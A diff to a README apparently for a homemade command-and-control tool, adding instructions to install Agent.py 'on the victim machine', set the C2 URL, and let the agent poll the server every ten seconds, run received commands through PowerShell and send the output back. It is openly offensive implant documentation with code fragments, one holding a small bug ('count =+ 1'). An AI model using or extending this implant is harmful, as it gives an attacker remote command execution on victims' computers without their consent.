@@ -24,6 +24,23 @@ For now you can only ran a command at a time. Open server.py and enter the comma
         self.wfile.write(response_string.encode('utf-8'))
 ```
 
+Agent.py needs to be installed and ran on the victim machine. Provide the C2 url as shown below.
+
+```
+    url = "http://localhost:8080"  # Replace your C2 URL 
+    # This string will be sent to C2 to verify it's alive and return output of a command ran
+    message_body = "ALIVE, Command Response: {}".format(output)
+```
+
+The http requests are sent in time intervals. You can set this in Agent.py as well. 
+
+```
+if command_to_run:
+            output = run_powershell_command(command_to_run)     
+        time.sleep(10)  
+        count =+ 1
+```
+
 ## Contributing
 
 Pull requests are welcome. For major changes, please open an issue first
